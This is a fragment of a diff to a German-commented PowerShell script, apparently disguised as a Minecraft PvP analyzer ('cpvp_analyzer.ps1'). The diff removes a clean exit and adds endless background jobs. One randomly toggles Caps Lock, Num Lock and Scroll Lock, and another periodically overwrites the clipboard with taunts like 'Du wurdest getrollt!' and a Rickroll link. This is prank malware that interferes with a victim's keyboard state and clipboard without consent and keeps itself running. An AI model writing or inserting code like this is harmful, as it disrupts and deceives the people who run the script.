+        Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
+    }
+}
 
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# ===== TASTATUR SPOOF =====
+$keyboardJob = Start-Job -ScriptBlock {
+    $wsh = New-Object -ComObject WScript.Shell
+    while ($true) {
+        if ((Get-Random -Minimum 1 -Maximum 100) -eq 1) {
+            $wsh.SendKeys('{CAPSLOCK}')
+            Start-Sleep -Milliseconds 100
+            $wsh.SendKeys('{NUMLOCK}')
+            Start-Sleep -Milliseconds 100
+            $wsh.SendKeys('{SCROLLLOCK}')
+        }
+        Start-Sleep -Seconds 30
+    }
+}
 
-# Watchdog beenden
-Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force
-Remove-Item "$env:TEMP\cpvp_analyzer.ps1" -Force
-Remove-Item "$env:TEMP\minecraft_cache" -Recurse -Force
-exit
+# ===== CLIPBOARD SPOOF =====
+$clipJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    $texts = @(
+        "MAIN2PACKET KING",
+        "Du wurdest getrollt!",
+        "😂😂😂",
+        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+        "👑👑👑"
+    )
+    while ($true) {
+        if ((Get-Random -Minimum 1 -Maximum 50) -eq 1) {
+            $randomText = Get-Random $texts
+            [System.Windows.Forms.Clipboard]::SetText($randomText)
+        }
+        Start-Sleep -Seconds 10
+    }
+}
+
+# ===== ALLES LÄUFT - FÜR IMMER =====
+while ($true) {
+    # Statistik im Hintergrund (nichts anzeigen)
+    $totalJobs = Get-Job | Where-Object {$_.State -eq "Running"} | Measure-Object | Select-Object -ExpandProperty Count
+    
+    # Alle 5 Minuten prüfen ob Jobs noch laufen
+    Start-Sleep -Seconds 300
+    
+    # Falls ein Job gestorben ist, neu starten
+    $deadJobs = Get-Job | Where-Object {$_.State -ne "Running"}
+    foreach ($job in $deadJobs) {
+        Remove-Job $job -Force
+        # Hier müsste man den Job neu starten - aber für jetzt reichts
+    }
+}
